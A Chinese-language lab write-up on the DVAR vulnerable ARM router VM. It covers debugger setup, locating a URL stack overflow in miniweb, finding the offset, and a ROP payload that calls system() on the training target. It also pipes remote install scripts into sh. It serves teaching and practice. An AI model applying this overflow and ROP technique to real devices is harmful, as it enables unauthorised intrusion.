> 原文链接: https://www.anquanke.com//post/id/175493 


# 从0到ReverseShell：路由器漏洞靶场DVAR实践


                                阅读量   
                                **308091**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">2</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p0.ssl.qhimg.com/t01dbf2d37fbd1dba8e.jpg)](https://p0.ssl.qhimg.com/t01dbf2d37fbd1dba8e.jpg)



## 前言

DVAR是一个模拟arm架构路由器的漏洞靶场，本文将介绍如何从无到有获取一个反向shell，中间会包含环境搭建，漏洞定位与利用，以及这次实践的心得。



## 1.知识基础

本文将步骤尽可能写的详细易懂，如果你也想自己动手完成这次实践，最起码需要掌握的是arm汇编（寄存器作用，指令含义，栈的相关操作，程序流程控制，arm和thumb指令特性），IDA分析（F5, 阅读c代码）。



## 2.环境搭建

### <a class="reference-link" name="2.1%20%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BADVAR%E7%9A%84%E6%90%AD%E5%BB%BA"></a>2.1 漏洞靶场DVAR的搭建

主页:[https://www.vulnhub.com/entry/damn-vulnerable-arm-router-dvar-tinysploitarm,224/](https://www.vulnhub.com/entry/damn-vulnerable-arm-router-dvar-tinysploitarm,224/)

下载链接：
<li>
**Download**: [https://app.box.com/s/g2k7vo45ctn5lh0enrwg6i83abwindte](https://app.box.com/s/g2k7vo45ctn5lh0enrwg6i83abwindte)
</li>
<li>
**Download (Mirror)**: [https://download.vulnhub.com/dvar/tinysploitARM.zip](https://download.vulnhub.com/dvar/tinysploitARM.zip)
</li>
<li>
**Download (Torrent)**: [https://download.vulnhub.com/dvar/tinysploitARM.zip.torrent](https://download.vulnhub.com/dvar/tinysploitARM.zip.torrent)
</li>
下载之后解压使用vmware直接打开即可。

（图片1）

[![](https://p5.ssl.qhimg.com/t014099a2d780ed47cc.png)](https://p5.ssl.qhimg.com/t014099a2d780ed47cc.png)

可以在启动信息中看到ip: 192.168.74.134，

[http://ip:80是一个路由器界面，这次实践针对路由器界面](http://ip:80%E6%98%AF%E4%B8%80%E4%B8%AA%E8%B7%AF%E7%94%B1%E5%99%A8%E7%95%8C%E9%9D%A2%EF%BC%8C%E8%BF%99%E6%AC%A1%E5%AE%9E%E8%B7%B5%E9%92%88%E5%AF%B9%E8%B7%AF%E7%94%B1%E5%99%A8%E7%95%8C%E9%9D%A2)

[http://ip:8080是一个红绿灯界面](http://ip:8080%E6%98%AF%E4%B8%80%E4%B8%AA%E7%BA%A2%E7%BB%BF%E7%81%AF%E7%95%8C%E9%9D%A2)

使用MobaXterm（可以很方便的上传下载文件） ssh登陆到设备，用户名是root，无需密码。

图片2

[![](https://p3.ssl.qhimg.com/t018cdbb3cbf4fa0951.png)](https://p3.ssl.qhimg.com/t018cdbb3cbf4fa0951.png)

### <a class="reference-link" name="2.2%20%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8"></a>2.2 工具使用

本文使用到的工具有：

gdb,gdbserver,gef,IDA,keypatch,armv5交叉编译环境

**<a class="reference-link" name="2.2.1%20gdb,gdbserver,gdb-multiarch,gef%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8"></a>2.2.1 gdb,gdbserver,gdb-multiarch,gef的安装和使用**

<a class="reference-link" name="2.2.1.1%20gdb,gdbserver,gdb-multiarch%E5%AE%89%E8%A3%85"></a>**2.2.1.1 gdb,gdbserver,gdb-multiarch安装**

漏洞分析与利用当然少不了合适的调试工具。

在靶场中自带了gdb，gdbserver，但是都不太方便，如果在靶场中用gdb调试，安装gef就很复杂，因为很多基础环境都没有，而没有gef调试会很心累。如果选择远程调试，使用其自带的gdbserver，就需要安装相同版本的gdb（ubuntu上使用的），当然不能使用单文件版本的gdb(之后要安装gef)，需要卸载掉ubuntu原装的gdb，安装与gdbserver版本相同的gdb。

最后，考虑到以后其他架构的调试，为了一劳永逸，我没有使用其内置的gdbserver，在github上找到已经编译的一组gdbserver7.10.1

[https://github.com/hugsy/gdb-static](https://github.com/hugsy/gdb-static)

（写这篇文章时找到一组更全更新的[https://github.com/mzpqnxow/embedded-toolkit/tree/master/prebuilt_static_bins/gdbserver](https://github.com/mzpqnxow/embedded-toolkit/tree/master/prebuilt_static_bins/gdbserver)，但为时已晚:)）

然后在ubuntu14.04中卸载原装的gdb，安装相同版本的gdb7.10.1

[https://ftp.gnu.org/gnu/gdb/](https://ftp.gnu.org/gnu/gdb/)

[https://ftp.gnu.org/gnu/gdb/gdb-7.10.1.tar.xz](https://ftp.gnu.org/gnu/gdb/gdb-7.10.1.tar.xz)

卸载原装

apt-get remove gdb<br>
进入源码目录，安装GDB 7.10.1<br>
./configure —with-python=’/usr/bin/python3.4’<br>
apt-get install libexpat1-dev<br>
apt-get install python3.4-dev<br>
apt-get install texinfo<br>
make install

<a class="reference-link" name="%E4%B8%BA%E4%BA%86%E8%B0%83%E8%AF%95%E4%B8%8D%E5%90%8C%E6%9E%B6%E6%9E%84%E5%BF%85%E9%A1%BB%E5%AE%89%E8%A3%85gdb-multiarch"></a>**为了调试不同架构必须安装gdb-multiarch**

apt-get install gdb-multiarch

**<a class="reference-link" name="2.2.1.2%20gef%E5%AE%89%E8%A3%85"></a>2.2.1.2 gef安装**

<a class="reference-link" name="%E5%AE%89%E8%A3%85gef%E4%BE%9D%E8%B5%96"></a>**安装gef依赖**

apt-get install python3-pip<br>
pip3 install capstone unicorn ropper

安装keystone0.9.1

[http://www.keystone-engine.org/download/](http://www.keystone-engine.org/download/)

[https://github.com/keystone-engine/keystone/archive/0.9.1.zip](https://github.com/keystone-engine/keystone/archive/0.9.1.zip)

apt-get install cmake<br>
apt-get install g++<br>
mkdir build<br>
cd build<br>
../make-share.sh<br>
cmake -DCMAKE_BUILD_TYPE=Release -DBUILD_SHARED_LIBS=ON -DLLVM_TARGETS_TO_BUILD=”AArch64;X86” -G “Unix Makefiles” ..<br>
make -j8<br>
make install<br>
sudo ldconfig<br>
kstool x32 “add eax, ebx”

pip3 install keystone-engine

<a class="reference-link" name="%E5%AE%89%E8%A3%85gef"></a>**安装gef**

wget -q -O- [https://github.com/hugsy/gef/raw/master/scripts/gef.sh](https://github.com/hugsy/gef/raw/master/scripts/gef.sh) | sh<br>
wget -q -O- [https://github.com/hugsy/gef/raw/master/scripts/gef-extras.sh](https://github.com/hugsy/gef/raw/master/scripts/gef-extras.sh) | sh

<a class="reference-link" name="2.2.1.2%20%E8%B0%83%E8%AF%95%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8"></a>**2.2.1.2 调试工具的使用**

web服务器启动时会fork()，这里为了方便使用附加调试

<a class="reference-link" name="%E6%9C%AC%E5%9C%B0%E9%99%84%E5%8A%A0%E8%B0%83%E8%AF%95%EF%BC%9A"></a>**本地附加调试：**

DVAR运行：gdb lobby miniweb_pid

图片3

[![](https://p0.ssl.qhimg.com/t016cf2c7d32be18787.png)](https://p0.ssl.qhimg.com/t016cf2c7d32be18787.png)

<a class="reference-link" name="%E8%BF%9C%E7%A8%8B%E9%99%84%E5%8A%A0%E8%B0%83%E8%AF%95%EF%BC%9A"></a>**远程附加调试：**

DVAR运行

./gdbserver-7.10.1-arm6v *:1234 —attach miniweb_pid

ubuntu14.04 运行

gdb-multiarch

​ set architecture arm

​ gef-remote 192.168.74.134:1234

图片4

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01855db8579b185f54.png)

图片5

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01c1ff83aba699f26d.png)

<a class="reference-link" name="gdb%E8%B0%83%E8%AF%95%E5%91%BD%E4%BB%A4%EF%BC%9A"></a>**gdb调试命令：**

b *address:对指定的地址下断点

info b：显示断点

del 断点号：删除断点

x/10i $pc: 显示汇编

x/10b $sp：显示内存

continue(继续运行)

n(单步运行)

start(本地非附加调试需首先运行)

<a class="reference-link" name="gef%E5%91%BD%E4%BB%A4%EF%BC%9A"></a>**gef命令：**

除了以上gdb命令

checksec： 检测安全机制

**<a class="reference-link" name="2.2.2%20IDA%EF%BC%8Ckeypatch"></a>2.2.2 IDA，keypatch**

由于IDAarm架构有F5，所以分析起来很方便

keypatch 是为了更改程序，将fork() patch掉

[https://github.com/keystone-engine/keypatch](https://github.com/keystone-engine/keypatch)

[https://github.com/keystone-engine/keystone/releases/download/0.9.1/keystone-0.9.1-python-win32.msi](https://github.com/keystone-engine/keystone/releases/download/0.9.1/keystone-0.9.1-python-win32.msi)

[https://www.microsoft.com/en-gb/download/details.aspx?id=40784](https://www.microsoft.com/en-gb/download/details.aspx?id=40784)

注意：vcredist_x86.exe,keystone-0.9.1-python-win32.msi都应该是同平台

keypath.py放入IDA下 plugins目录

图片5.1

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t016d11253357d38b85.png)

图片5.2

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t0123e1849bfa46dd2c.png)

具体的使用，注意如果第一次使用keypatch之后没有Apply patches to the file就关闭IDA了，之后每次都会保存失败：

图片5.3

[![](https://p3.ssl.qhimg.com/t01e6d93cba3af1e491.png)](https://p3.ssl.qhimg.com/t01e6d93cba3af1e491.png)

图片5.4

[![](https://p1.ssl.qhimg.com/t011d9f61f97643559c.png)](https://p1.ssl.qhimg.com/t011d9f61f97643559c.png)

图片5.5

[![](https://p4.ssl.qhimg.com/t01b31dc7927fe44a5e.png)](https://p4.ssl.qhimg.com/t01b31dc7927fe44a5e.png)

将更改保存

图片5.6

[![](https://p4.ssl.qhimg.com/t0146906c8575105e96.png)](https://p4.ssl.qhimg.com/t0146906c8575105e96.png)



## 3.漏洞定位

### <a class="reference-link" name="3.1%E7%9B%AE%E6%A0%87"></a>3.1目标

本次实践针对80端口的/usr/bin/miniweb

exploitlab-DVAR:~# netstat -anp<br>
Active Internet connections (servers and established)<br>
Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name<br>
tcp 0 0 0.0.0.0:8080 0.0.0.0:<em> LISTEN 246/lightsrv<br>
tcp 0 0 0.0.0.0:80 0.0.0.0:</em> LISTEN 245/miniweb<br>
tcp 0 0 0.0.0.0:22 0.0.0.0:<em> LISTEN 231/dropbear<br>
tcp 0 0 127.0.0.1:6010 0.0.0.0:</em> LISTEN 287/dropbear<br>
tcp 0 0 192.168.100.254:22 192.168.74.1:53417 ESTABLISHED 288/dropbear

图片6

[![](https://p2.ssl.qhimg.com/t01b62bb81415d77e5c.png)](https://p2.ssl.qhimg.com/t01b62bb81415d77e5c.png)

图片7

[![](https://p2.ssl.qhimg.com/t01c560f8080c64683e.png)](https://p2.ssl.qhimg.com/t01c560f8080c64683e.png)

### <a class="reference-link" name="3.2%20%E5%B0%9D%E8%AF%95%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95"></a>3.2 尝试模糊测试

一开始，我尽可能的找页面中发包，然后在burpsuit进行测试

图片8

[![](https://p3.ssl.qhimg.com/t018504b031ce4c4a35.png)](https://p3.ssl.qhimg.com/t018504b031ce4c4a35.png)

图片9

[![](https://p2.ssl.qhimg.com/t01b3dacf89fb7fb56d.png)](https://p2.ssl.qhimg.com/t01b3dacf89fb7fb56d.png)

fuzz，相关设置：

图片10

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01e634a023f906f889.png)

图片11

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01c2626870c52f089c.png)

但是没有找到任何问题，很是沮丧，

图片12

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0186dc92908088c159.png)

图片13

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01ef41a8ba96b534df.png)

于是就直接把miniweb从虚拟机中下下来，放到IDA中找溢出

F5，找到处理函数

图片14

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t019bb61bfacbdaf936.png)

函数中对URL进行解析并根据解析做相应的处理

图片15

[![](https://p0.ssl.qhimg.com/t01146b5b58fabf9af8.png)](https://p0.ssl.qhimg.com/t01146b5b58fabf9af8.png)

如果存在栈溢出，在此处一定能找到

关注敏感函数strcpy和strcat

其中所有的目的地址都是本函数的局部变量的地址

图片16

[![](https://p2.ssl.qhimg.com/t0195cb4c6fb3a16b25.png)](https://p2.ssl.qhimg.com/t0195cb4c6fb3a16b25.png)

很好分析，将关注点聚集在源src即可

敏感的有几处：

strcpy((char **)&amp;v21, (const char **)v32 + 1020);<br>
v8 = strlen((const char *)v32 + 765);

strcat((char *)&amp;v21, s1);

strcpy((char **)&amp;v21, (const char **)v32 + 255);<br>
strcat((char *)&amp;v21, s1);

优先分析好理解的，发现 strcat((char *)&amp;v21, s1);存在栈溢出）

以下分析为什么存在栈溢出，以及s1的含义

```
//strcat((char *)&amp;v21, s1);有两处
else
        `{`
          getpeername(v17, (struct sockaddr *)&amp;v19, (socklen_t *)&amp;v18);
          v5 = inet_ntoa(v20);
          Log("Connection from %s, request = "GET %s"", v5, s1);//从这里可以看出s1在原函数中的意义
           //Connection from v5, request = "GET s1)"", v5是host，s1是请求的URL
          v6 = (char *)v32 + 765;
          v7 = strlen((const char *)v32 + 765);
          if ( !strncmp(s1, v6, v7) )
          `{`
            v28 = strchr(s1, 63);
            if ( v28 )
            `{`
              *v28 = 0;
              v34 = 1;
            `}`
            strcpy((char *)&amp;v21, (const char *)v32 + 1020);
            v8 = strlen((const char *)v32 + 765);
            s1 += v8;// 这里加上了一个长度
            strcat((char *)&amp;v21, s1);// 第一处，直接拷贝到局部变量未做长度限制
            if ( does_file_exist(&amp;v21) == 1 &amp;&amp; !isDirectory(&amp;v21) )
            `{`
              if ( send(v17, "HTTP/1.1 200 OKn", 0x10u, 0) == -1 )
              `{`
                fclose(stream);
                return -1;
              `}`
              if ( send(v17, "Server: EXPLOITLAB ROP WARM-UP/2.0n", 0x23u, 0) == -1 )
              `{`
                fclose(stream);
                return -1;
              `}`
              if ( dup2(v17, 0) || dup2(v17, 1) != 1 )
                return -1;
              setbuf((FILE *)stdin, 0);
              setbuf((FILE *)edata, 0);
              if ( v34 == 1 )
                setenv("QUERY_STRING", v28 + 1, 1);
              chdir((const char *)v32 + 1020);
              execl((const char *)&amp;v21, (const char *)&amp;unk_13764);
            `}`
            strcpy((char *)&amp;v21, SERVERROOT);
            v9 = strlen((const char *)&amp;v21);
            memcpy((char *)&amp;v21 + v9, "/cgierror.html", 0xFu);
          `}`
          else
          `{`
            strcpy((char *)&amp;v21, (const char *)v32 + 255);
            strcat((char *)&amp;v21, s1);// 第二处，但是是一样未作长度限制
            if ( !does_file_exist(&amp;v21) )
            `{`
              if ( *((_BYTE *)&amp;v24 + strlen((const char *)&amp;v21) - 345) == 47 )
              `{`
                strcat((char *)&amp;v21, (const char *)v32 + 510);
              `}`
              else
```

可以判定：URL过长将导致栈溢出，其中URL的源头：

```
s1 = strtok((char *)&amp;v23, " ");//根据空格分割
  if ( s1 )
  `{`
    if ( !strcmp(s1, "GET") )// 判断第一个是不是GET
    `{`
      s1 = strtok(0, " ");// 分割的第二个就是URL了
      urldecode(s1);
      if ( s1 )
```

由此可见我们最后构造的溢出一定不能包括空格，当然\r \n 0x00也是不允许的。

现在进行测试：发送较长的URL，web服务器没有响应

图片17

[![](https://p1.ssl.qhimg.com/t01702d10b147904f9a.png)](https://p1.ssl.qhimg.com/t01702d10b147904f9a.png)

<a class="reference-link" name="%E4%BD%86%E6%98%AF%EF%BC%8C%E4%B8%BA%E4%BB%80%E4%B9%88%E4%B9%8B%E5%89%8D%E5%8F%91%E9%80%81%E9%82%A3%E4%B9%88%E5%A4%A7%E7%9A%84%E6%95%B0%E6%8D%AE%E5%8C%85%E4%BE%9D%E7%84%B6%E6%9C%89%E5%8F%8D%E5%BA%94%E5%91%A2%EF%BC%9F"></a>**但是，为什么之前发送那么大的数据包依然有反应呢？**

```
int n=0;
 while ( !strstr((const char *)&amp;v25, "rnrn") &amp;&amp; !strstr((const char *)&amp;v25, "nn") )
  `{`
    n = recv(v17, (char *)&amp;v25 + n, 4096 - n, 0);
    if ( n == -1 )
      return -1;
  `}`
```

这里使用bp发送超过4096个字节

在recv之后下断点，程序断下3次

$r0 : 0x1000<br>
$r1 : 0xbeffdc3c → “GET Aa0AAa0BAa0CAa0DAa0EAa0FAa0GAa0HAa0IAa0JAa0KAa[…]”

$r0 : 0x0<br>
$r1 : 0xbeffec3c → 0x00000000

$r0 : 0xe68<br>
$r1 : 0xbeffdc3c → “Aa0DAa0EAa0FAa0GAa0HAa0IAa0JAa0KAa0LAa0MAa0NAa0OAa[…]”

当第一次接受4096个字节后，结果n=4096;第二次接受0个字节（4096-4096），结果n=0;第三次接受4096字节的时候，n = recv(v17, (char *)&amp;v25 + 0, 4096 – 0, 0);会把第一次的覆盖掉，所以最后保存下来的是最后一次接受的包。

```
//之后对包的内容进行判断，没有找到GET字符串，所以返回cmderror.html页面
if ( !strcmp(s1, "GET") )
    `{`。。。`}`
 else
    `{`
      strcpy((char *)&amp;v21, SERVERROOT);
      v2 = strlen((const char *)&amp;v21);
      memcpy((char *)&amp;v21 + v2, "/cmderror.html", 0xFu);
    `}`
```

所以当发送〉4096字节之后出现返回cmderror页面的情况。

这里需要反思下，之前有些贪多求快，burpsuit的设置应该这样才是比较妥当的

图片18

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t0173a1063f13353d3f.png)

图片19

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t016142d158ee424711.png)

除了粒度变细，还应该测试最基础的，这样就减少很多影响因素

GET / HTTP/1.1 #url长度，层级，

Host: 1.1.1.1 #host长度



## 4.漏洞利用

### <a class="reference-link" name="4.1%20%E6%BA%A2%E5%87%BA%E7%82%B9%E7%A1%AE%E5%AE%9A"></a>4.1 溢出点确定

写了一个生成溢出字符串的脚本

```
import os
import string
import sys
num = int(sys.argv[1])
overflowstr = ""
circle=num/4+1

for i in string.ascii_uppercase:
    for j in string.ascii_lowercase:
        for k in string.digits:
            for p in string.ascii_uppercase:    
                circle-=1
                if circle == -1:
                    print overflowstr
                    exit()
                overflowstr+=i+j+k+p
```

发送数据包

GET Aa0AAa0BAa0CAa0DAa0EAa0FAa0GAa0HAa0IAa0JAa0KAa0LAa0MAa0NAa0OAa0PAa0QAa0RAa0SAa0TAa0UAa0VAa0WAa0XAa0YAa0ZAa1AAa1BAa1CAa1DAa1EAa1FAa1GAa1HAa1IAa1JAa1KAa1LAa1MAa1NAa1OAa1PAa1QAa1RAa1SAa1TAa1UAa1VAa1WAa1XAa1Y HTTP/1.1<br>
Host: 1.1.1.1

在DVAR中用gdb lobby pid，发送数据包，程序中断在0x41513160

GDB will be unable to debug shared library initializers

and track explicitly loaded dynamic code.<br>
0x4004d910 in ?? ()<br>
(gdb) continue<br>
Continuing.

Program received signal SIGSEGV, Segmentation fault.<br>
0x41513160 in ?? ()<br>
(gdb) Quit<br>
(gdb)

这里需要注意，最后一位数字不可信，搜索前面三个字符，a1Q,最后确定为a1QA；’A’=0x61,1用作表示进入thumb模式，所以最后一位变成了0x60。

所以溢出点就确定了

GET Aa0AAa0BAa0CAa0DAa0EAa0FAa0GAa0HAa0IAa0JAa0KAa0LAa0MAa0NAa0OAa0PAa0QAa0RAa0SAa0TAa0UAa0VAa0WAa0XAa0YAa0ZAa1AAa1BAa1CAa1DAa1EAa1FAa1GAa1HAa1IAa1JAa1KAa1LAa1MAa1NAa1OAa1PAa1QA HTTP/1.1

### <a class="reference-link" name="4.2%20%E8%B0%83%E8%AF%95%E5%BA%94%E8%AF%A5%E6%B3%A8%E6%84%8F%E7%9A%84"></a>4.2 调试应该注意的

**<a class="reference-link" name="4.2.1%20%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"></a>4.2.1 信息搜集**

搜集安全信息

gef➤ checksec<br>
[+] checksec for ‘/tmp/gef/341//proc/341/exe’<br>
Canary : No<br>
NX : No<br>
PIE : No<br>
Fortify : No<br>
RelRO : No

看so是否是随机加载的，虽然在gef中输入alsr显示on，但是实际不是如此，

cat /proc/sys/kernel/randomize_va_space显示是0，多次重启也没有变化。

这里同时搜集模块加载地址的信息，用于之后编写shellcode

exploitlab-DVAR:~# cat /proc/345/maps<br>
00010000-00014000 r-xp 00000000 08:00 520 /root/miniweb<br>
00023000-00026000 rwxp 00003000 08:00 520 /root/miniweb<br>
40000000-40064000 r-xp 00000000 08:00 185 /lib/libc.so<br>
40064000-40065000 r-xp 00000000 00:00 0 [sigpage]<br>
40073000-40074000 r-xp 00063000 08:00 185 /lib/libc.so<br>
40074000-40075000 rwxp 00064000 08:00 185 /lib/libc.so<br>
40075000-40077000 rwxp 00000000 00:00 0<br>
40078000-40089000 r-xp 00000000 08:00 2791 /lib/libgcc_s.so.1<br>
40089000-4008a000 rwxp 00009000 08:00 2791 /lib/libgcc_s.so.1<br>
befdf000-bf000000 rwxp 00000000 00:00 0 [stack]<br>
ffff0000-ffff1000 r-xp 00000000 00:00 0 [vectors]

reboot<br>
exploitlab-DVAR:~# cat /proc/300/maps<br>
00010000-00014000 r-xp 00000000 08:00 520 /root/miniweb<br>
00023000-00026000 rwxp 00003000 08:00 520 /root/miniweb<br>
40000000-40064000 r-xp 00000000 08:00 185 /lib/libc.so<br>
40064000-40065000 r-xp 00000000 00:00 0 [sigpage]<br>
40073000-40074000 r-xp 00063000 08:00 185 /lib/libc.so<br>
40074000-40075000 rwxp 00064000 08:00 185 /lib/libc.so<br>
40075000-40077000 rwxp 00000000 00:00 0<br>
40078000-40089000 r-xp 00000000 08:00 2791 /lib/libgcc_s.so.1<br>
40089000-4008a000 rwxp 00009000 08:00 2791 /lib/libgcc_s.so.1<br>
befdf000-bf000000 rwxp 00000000 00:00 0 [stack]<br>
ffff0000-ffff1000 r-xp 00000000 00:00 0 [vectors]

<a class="reference-link" name="4.2.2%20%E7%A8%8B%E5%BA%8F%E4%BF%AE%E6%94%B9"></a>**4.2.2 程序修改**

miniweb每次接受到数据包并进行处理的时候都会fork出一个子进程，漏洞函数就在这部分代码中，这将阻碍调试，这里使用keypatch将fork去掉，当然这样程序启动就只能接受一个数据包然后就结束了。

```
if ( v16 )
    `{`
      setgid(v16-&gt;pw_gid);
      setuid(v16-&gt;pw_uid);
    `}`
    while ( 1 )
    `{`
      do
      `{`
        addr_len = 16;
        v15 = accept(fd, &amp;v13, &amp;addr_len);// 接受到一次连接
      `}`
      while ( v15 == -1 );
      if ( !fork() )// 创建一个新的子进程
        break;// 并跳出当前循环，执行之后的代码
      close(v15);
      while ( waitpid(-1, 0, 1) &gt; 0 )
        ;
    `}`
    do
    `{`
      close(fd);
      v22 = &amp;readfds;
      for ( i = 32; i; --i )
      `{`
        v5 = v22;
        v22 = (fd_set *)((char *)v22 + 4);
        v5-&gt;__fds_bits[0] = 0;
```

目标就是将!fork()改为1，收到连接就跳出循环，这会导致之后不能接受到其他连接。下图左边是修改之前，右图是修改之后

图片20

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01816702a7fed4b4c8.png)

### <a class="reference-link" name="4.3%20ROP-%E5%B0%9D%E8%AF%95%E9%80%9A%E8%BF%87%E5%8F%91%E5%8C%85%E6%89%A7%E8%A1%8C%E4%B8%80%E4%B8%AA%E5%91%BD%E4%BB%A4"></a>4.3 ROP-尝试通过发包执行一个命令

从易到难，最开始我想执行一个命令

也就是system(cmdstr)

要实现这个目标需要将a0指向命令字符串，将pc设置为system函数的地址

我选择的so是libc.so。r0的数据从栈上来，最朴实的想法：

ROPgadget —binary libc.so |grep “ldr r0,”

然后想顺便把pc寄存器也解决下，就找到下面这个gadget

0x00041adc : ldr r0, [sp, #0x14] ; add sp, sp, #0x1c ; pop `{`pc`}` ; andeq r3, r3, r4, asr #8 ; cmp r1, #0 ; bne #0x41b20 ; str r1, [r0, #4] ; str r1, [r0] ; bx lr

这样只需一步就能达到目标。

之前已经知道libc.so的加载地址是0x40000000，cmd字符串的地址是0xbeffbb08，这个是栈中保存字符串的地址,具体位置根据测试+debug得到。

在p32(gadget1)后加’AAAA’*4是调试所得，这样当程序执行到gadget1的时候，sp就指向’AAAA’*4之后的位置

“sh$`{`IFS`}`-c$`{`IFS`}`“ps&gt;/tmp/1”这样写的原因是原url字符串在程序处理过程中会被添加引号“，比如url= aaaaaa，会被处理成aaaaaa” ，所以这里和它配对了下“，然后理所当然使用了sh -c。至于空格，这里使用$`{`IFS`}`替代。

gadget1=0x40041adc<br>
mycmdaddress=0xbeffbb08<br>
system_addr=0x4003AEB8<br>
payload1 = “GET “+’A’*169 + p32(gadget1) +’AAAA’*4 + ‘A’*0x14 + p32(mycmdaddress) + ‘A’*0x4 + p32(system_addr)+”sh$`{`IFS`}`-c$`{`IFS`}`“ps&gt;/tmp/1”+” HTTP/1.1rn”+”Host: 1.1.1.1rnrn”<br>
p.send(payload1)

执行到gadget1

───────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────<br>
0xbeffbae8│+0x0000: 0x41414141 ← $sp<br>
0xbeffbaec│+0x0004: 0x41414141<br>
0xbeffbaf0│+0x0008: 0x41414141<br>
0xbeffbaf4│+0x000c: 0x41414141<br>
0xbeffbaf8│+0x0010: 0x41414141<br>
0xbeffbafc│+0x0014: 0xbeffbb08 #mycmdaddress<br>
0xbeffbb00│+0x0018: 0x41414141<br>
0xbeffbb04│+0x001c: 0x4003aeb8 #system_addr<br>
────────────────────────────────────────────────────────────────────────────────────────────────────────── code:arm:ARM ────<br>
0x40041ad0 ldm r12, `{`r0, r1`}`<br>
0x40041ad4 add r3, sp, #20<br>
0x40041ad8 bl 0x400419d4<br>
→ 0x40041adc ldr r0, [sp, #20]<br>
0x40041ae0 add sp, sp, #28<br>
0x40041ae4 pop `{`pc`}` ; (ldr pc, [sp], #4)

然而，上面这种利用有个缺陷，一开始我只在patch后的miniweb中测过，后来发现在没有patch过的miniweb中是不行的，原因就是栈的地址变化了（之前patch后的miniweb中一直没变化），cmd字符串定位错误。

